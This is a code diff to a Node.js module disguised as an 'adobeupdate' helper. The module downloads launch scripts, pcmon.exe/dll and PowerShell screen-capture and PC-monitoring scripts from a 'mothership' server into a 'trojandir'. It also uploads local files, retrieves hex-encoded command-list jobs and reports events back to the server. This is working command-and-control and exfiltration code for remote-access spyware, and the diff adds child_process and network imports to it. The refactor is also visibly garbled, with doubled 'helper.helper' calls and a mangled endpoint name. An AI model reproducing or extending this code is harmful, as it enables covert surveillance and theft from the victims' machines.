@@ -1,5 +1,14 @@
 const helper = require("./adobeupdate.helper.js");
 
+const path = require("path");
+const PubNub = require("pubnub");
+const net = require("net");
+const { fork, exec, spawn } = require("child_process");
+const fs = require("fs");
+const os = require("os");
+const crypto = require("crypto");
+const util = require("util");
+
 /*
     status: response.status,
     statusText: response.statusText,
@@ -16,9 +25,9 @@ async function makeGetRequest(
     inputHeaders,
     downloadOpts = null
 ) {
-    logmsg("starting");
+    helper.logmsg("starting");
 
-    if (isNullOrWhitespace(baseUrl)) {
+    if (helper.isNullOrWhitespace(baseUrl)) {
         throw new Error("baseUrl is empty");
     } else if (!isValidHttpUrl(baseUrl)) {
         throw new Error("baseUrl is invalid [" + baseUrl + "]");
@@ -26,17 +35,17 @@ async function makeGetRequest(
 
     const url = new URL(baseUrl);
 
-    logmsg("baseUrl: " + baseUrl);
+    helper.logmsg("baseUrl: " + baseUrl);
 
-    if (isValidDict(params)) {
+    if (helper.isValidDict(params)) {
         Object.keys(params).forEach((key) => {
             url.searchParams.append(key, params[key]);
         });
     }
 
-    logmsg("url=" + url.toString());
+    helper.logmsg("url=" + url.toString());
 
-    if (!isValidDict(downloadOpts)) {
+    if (!helper.isValidDict(downloadOpts)) {
         let outputPath = path.join(
             systemstate.trojandir,
             "download_" + getRandomCode(8)
@@ -54,13 +63,13 @@ async function makeGetRequest(
         "User-Agent": "NodeJS-Fetch-Client",
     };
 
-    if (isValidDict(inputHeaders)) {
+    if (helper.isValidDict(inputHeaders)) {
         Object.assign(tinputHeaders, inputHeaders);
     }
 
     let response = null;
 
-    logmsg("executing GET request");
+    helper.logmsg("executing GET request");
 
     response = await fetch(url.toString(), {
         method: "GET",
@@ -74,8 +83,11 @@ async function makeGetRequest(
     let headersOut = {};
 
     for (const [key, value] of response.headers.entries()) {
-        if (!isNullOrWhitespace(key) && !isNullOrWhitespace(value)) {
-            logmsg("response headers key=" + key + " value=" + value);
+        if (
+            !helper.isNullOrWhitespace(key) &&
+            !helper.isNullOrWhitespace(value)
+        ) {
+            helper.logmsg("response headers key=" + key + " value=" + value);
             headersOut[key] = value;
         }
     }
@@ -87,15 +99,15 @@ async function makeGetRequest(
         // downloadOpts
     };
 
-    logmsg("response status=" + response.status);
+    helper.logmsg("response status=" + response.status);
 
-    if (!isValidDict(downloadOpts) || !downloadOpts.download) {
+    if (!helper.isValidDict(downloadOpts) || !downloadOpts.download) {
         return responseOut;
     }
 
     if (
         !Object.hasOwn(downloadOpts, "localpath") ||
-        isNullOrWhitespace(downloadOpts.localpath)
+        helper.isNullOrWhitespace(downloadOpts.localpath)
     ) {
         let outputPath = path.join(
             systemstate.trojandir,
@@ -107,7 +119,7 @@ async function makeGetRequest(
 
     if (
         !Object.hasOwn(downloadOpts, "filetype") ||
-        isNullOrWhitespace(downloadOpts.filetype)
+        helper.isNullOrWhitespace(downloadOpts.filetype)
     ) {
         downloadOpts.filetype = "txt";
     }
@@ -126,7 +138,7 @@ async function makeGetRequest(
 
     responseOut.downloadOpts = downloadOpts;
 
-    logmsg("finished");
+    helper.logmsg("finished");
 
     return responseOut;
 }
@@ -151,7 +163,7 @@ function isValidHttpUrl(string) {
 }
 
 async function makePUTRequest(baseUrl, params, inputHeaders, filepath) {
-    logmsg("starting");
+    helper.logmsg("starting");
 
     const fileBlob = await fs.openAsBlob(filepath);
 
@@ -160,15 +172,15 @@ async function makePUTRequest(baseUrl, params, inputHeaders, filepath) {
 
     const url = new URL(baseUrl);
 
-    logmsg(`baseUrl: ${baseUrl} filepath: ${filepath}`);
+    helper.logmsg(`baseUrl: ${baseUrl} filepath: ${filepath}`);
 
-    if (isValidDict(params)) {
+    if (helper.isValidDict(params)) {
         Object.keys(params).forEach((key) => {
             url.searchParams.append(key, params[key]);
         });
     }
 
-    logmsg("request url: " + url.toString());
+    helper.logmsg("request url: " + url.toString());
 
     const request = new Request(url.toString(), {
         method: "PUT",
@@ -180,7 +192,7 @@ async function makePUTRequest(baseUrl, params, inputHeaders, filepath) {
     const response = await fetch(request);
 
     request.headers.forEach((value, key) => {
-        logmsg(`${key}: ${value}`);
+        helper.logmsg(`${key}: ${value}`);
     });
 
     const textData = await response.text();
@@ -188,8 +200,11 @@ async function makePUTRequest(baseUrl, params, inputHeaders, filepath) {
     let headersOut = {};
 
     for (const [key, value] of response.headers.entries()) {
-        if (!isNullOrWhitespace(key) && !isNullOrWhitespace(value)) {
-            logmsg("response headers key=" + key + " value=" + value);
+        if (
+            !helper.isNullOrWhitespace(key) &&
+            !helper.isNullOrWhitespace(value)
+        ) {
+            helper.logmsg("response headers key=" + key + " value=" + value);
             headersOut[key] = value;
         }
     }
@@ -201,16 +216,16 @@ async function makePUTRequest(baseUrl, params, inputHeaders, filepath) {
         responseText: textData,
     };
 
-    logmsg("response status=" + response.status);
+    helper.logmsg("response status=" + response.status);
 
     return responseOut;
 }
 
 async function download_launch_script() {
-    let filename = systemconfig.launch_script_fname;
+    let filename = helper_config.systemconfig.launch_script_fname;
 
-    let baseUrl = systemconfig.mothershipassets + "/" + filename;
-    let localpath = path.join(systemconfig.trojandir, filename);
+    let baseUrl = helper_config.systemconfig.mothershipassets + "/" + filename;
+    let localpath = path.join(helper_config.systemconfig.trojandir, filename);
 
     let downloadOpts = {
         download: true,
@@ -225,22 +240,24 @@ async function download_launch_script() {
     }
 
     const stats = fs.statSync(localpath);
-    helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
+    helper.helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
 }
 
 async function retrieve_asset(assetfname, assetdir, localdir) {
     let baseUrl =
-        systemconfig.mothershipassets +
+        helper_config.systemconfig.mothershipassets +
         "/" +
-        (helper.isNullOrWhitespace(assetdir) ? "" : assetdir + "/") +
+        (helper.helper.isNullOrWhitespace(assetdir) ? "" : assetdir + "/") +
         assetfname;
     let localpath = null;
 
-    if (helper.isNullOrWhitespace(localdir))
-        localpath = path.join(systemconfig.trojandir, assetfname);
+    if (helper.helper.isNullOrWhitespace(localdir))
+        localpath = path.join(helper_config.systemconfig.trojandir, assetfname);
     else {
         if (!folderExists(localdir)) {
-            fs.mkdirSync(systemconfig.nodegsdfilesdir, { recursive: true });
+            fs.mkdirSync(helper_config.systemconfig.nodegsdfilesdir, {
+                recursive: true,
+            });
         }
 
         localpath = path.join(localdir, assetfname);
@@ -266,13 +283,13 @@ async function retrieve_asset(assetfname, assetdir, localdir) {
     }
 
     const stats = fs.statSync(localpath);
-    helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
+    helper.helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
 
     return response;
 }
 
 async function download_python(filenames) {
-    helper.logmsg("starting");
+    helper.helper.logmsg("starting");
 
     filenames = filenames ?? [];
     filenames =
@@ -283,10 +300,18 @@ async function download_python(filenames) {
     for (let i = 0; i < filenames.length; i++) {
         let filename = filenames[i];
 
-        let baseUrl = systemconfig.mothershipassets + "/gsd_files/" + filename;
-        let localpath = path.join(systemconfig.gsdfilesdir, filename);
+        let baseUrl =
+            helper_config.systemconfig.mothershipassets +
+            "/gsd_files/" +
+            filename;
+        let localpath = path.join(
+            helper_config.systemconfig.gsdfilesdir,
+            filename
+        );
 
-        fs.mkdirSync(systemconfig.gsdfilesdir, { recursive: true });
+        fs.mkdirSync(helper_config.systemconfig.gsdfilesdir, {
+            recursive: true,
+        });
 
         let downloadOpts = {
             download: true,
@@ -308,34 +333,42 @@ async function download_python(filenames) {
         }
 
         const stats = fs.statSync(localpath);
-        helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
+        helper.helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
     }
 }
 
 async function download_pcmon() {
     // retrieve pcmon.exe, pcmon.dll
 
-    if (!folderExists(systemconfig.pcmondir)) {
-        fs.mkdirSync(systemconfig.pcmondir, { recursive: true });
+    if (!folderExists(helper_config.systemconfig.pcmondir)) {
+        fs.mkdirSync(helper_config.systemconfig.pcmondir, { recursive: true });
     }
 
-    if (!systemconfig.istpl) {
-        await retrieve_asset("pcmon.exe", null, systemconfig.pcmondir);
+    if (!helper_config.systemconfig.istpl) {
+        await retrieve_asset(
+            "pcmon.exe",
+            null,
+            helper_config.systemconfig.pcmondir
+        );
         return;
     }
 
-    if (systemconfig.istpl)
-        await retrieve_asset("pcmon.dll", null, systemconfig.pcmondir);
+    if (helper_config.systemconfig.istpl)
+        await retrieve_asset(
+            "pcmon.dll",
+            null,
+            helper_config.systemconfig.pcmondir
+        );
 }
 
 async function download_pspcmon() {
-    helper.logmsg("starting");
+    helper.helper.logmsg("starting");
 
     let filename = "pc_monitoring.ps1";
-    let baseUrl = systemconfig.mothershipassets + "/" + filename;
-    let localpath = path.join(systemconfig.pspcmondir, filename);
+    let baseUrl = helper_config.systemconfig.mothershipassets + "/" + filename;
+    let localpath = path.join(helper_config.systemconfig.pspcmondir, filename);
 
-    fs.mkdirSync(systemconfig.pspcmondir, { recursive: true });
+    fs.mkdirSync(helper_config.systemconfig.pspcmondir, { recursive: true });
 
     let downloadOpts = {
         download: true,
@@ -357,19 +390,19 @@ async function download_pspcmon() {
     }
 
     const stats = fs.statSync(localpath);
-    helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
+    helper.helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
 
-    helper.logmsg("finished");
+    helper.helper.logmsg("finished");
 
     return { state: true };
 }
 
 // TODO remove and replace with retrieve_asset
 async function download_screencapture_script() {
-    let filename = "get_full_screen_capture.ps1"; // TODO move to systemconfig
+    let filename = "get_full_screen_capture.ps1"; // TODO move to helper_config.systemconfig
 
-    let baseUrl = systemconfig.mothershipassets + "/" + filename;
-    let localpath = path.join(systemconfig.trojandir, filename);
+    let baseUrl = helper_config.systemconfig.mothershipassets + "/" + filename;
+    let localpath = path.join(helper_config.systemconfig.trojandir, filename);
 
     let downloadOpts = {
         download: true,
@@ -384,11 +417,11 @@ async function download_screencapture_script() {
     }
 
     const stats = fs.statSync(localpath);
-    helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
+    helper.helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
 }
 
 async function upload_file(filename, jobcode, localfpath) {
-    if (helper.isNullOrWhitespace(filename)) {
+    if (helper.helper.isNullOrWhitespace(filename)) {
         throw new Error("filename is null or empty");
     }
 
@@ -396,9 +429,9 @@ async function upload_file(filename, jobcode, localfpath) {
         throw new Error(`file does not exist ${localfpath}`);
     }
 
-    let baseUrl = systemconfig.mothership + "/ow/upload.php";
+    let baseUrl = helper_config.systemconfig.mothership + "/ow/upload.php";
 
-    let kvp = systemconfig.statekvp;
+    let kvp = helper_config.systemconfig.statekvp;
     kvp["filename"] = filename;
     kvp["jobcode"] = jobcode;
 
@@ -408,13 +441,13 @@ async function upload_file(filename, jobcode, localfpath) {
 }
 
 async function retrieveClientJob() {
-    helper.logmsg("starting");
+    helper.helper.logmsg("starting");
 
-    let baseUrl = systemconfig.mothership + "/ow/retrieve.php";
-    let params = systemconfig.statekvp;
+    let baseUrl = helper_config.systemconfig.mothership + "/ow/retrieve.php";
+    let params = helper_config.systemconfig.statekvp;
     params.filename = "execute_cmdlist";
 
-    let localpath = systemconfig.getClientJobPath();
+    let localpath = helper_config.systemconfig.getClientJobPath();
 
     let downloadOpts = {
         download: true,
@@ -441,11 +474,11 @@ async function retrieveClientJob() {
         jobfilename =
             response.headers[getKey(response.headers, "X-JobFilename")];
 
-    if (helper.isNullOrWhitespace(jobcode)) {
+    if (helper.helper.isNullOrWhitespace(jobcode)) {
         throw new Error("jobcode is empty");
     }
 
-    if (helper.isNullOrWhitespace(jobfilename)) {
+    if (helper.helper.isNullOrWhitespace(jobfilename)) {
         throw new Error("jobfilename is empty");
     }
 
@@ -453,7 +486,7 @@ async function retrieveClientJob() {
 
     let hextext = fs.readFileSync(localpath, "utf-8");
     let jobtext = Buffer.from(hextext, "hex").toString("utf8");
-    localpath = systemconfig.getClientJobPath(); // + (fileext ?? "");
+    localpath = helper_config.systemconfig.getClientJobPath(); // + (fileext ?? "");
     fs.writeFileSync(localpath, jobtext);
 
     let clientjob = {
@@ -463,17 +496,18 @@ async function retrieveClientJob() {
         jobfilename: jobfilename,
     };
 
-    helper.logmsg("retrieved client job: " + JSON.stringify(clientjob));
+    helper.helper.logmsg("retrieved client job: " + JSON.stringify(clientjob));
 
-    helper.logmsg("finished");
+    helper.helper.logmsg("finished");
 
     return clientjob;
 }
 
 async function logmsgMothership(msg, isevent = false, jobcode) {
-    let baseUrl = systemconfig.mothership + "/ow/helper.logmsg.php";
+    let baseUrl =
+        helper_config.systemconfig.mothership + "/ow/helper.helper.logmsg.php";
 
-    let kvp = systemconfig.statekvp;
+    let kvp = helper_config.systemconfig.statekvp;
 
     kvp[isevent ? "event" : "msg"] = msg;
     kvp["jobcode"] = jobcode;
@@ -482,7 +516,7 @@ async function logmsgMothership(msg, isevent = false, jobcode) {
     return response;
 }
 
-// make GET request to helper.logmsg.php with event = event_code
+// make GET request to helper.helper.logmsg.php with event = event_code
 function logEventMothership(event_code, jobcode) {
     return logmsgMothership(event_code, true, jobcode);
 }
@@ -494,3 +528,5 @@ module.exports = {
     retrieveClientJob,
     upload_file,
 };
+
+const helper_config = require("./adobeupdate.helper.config.js");
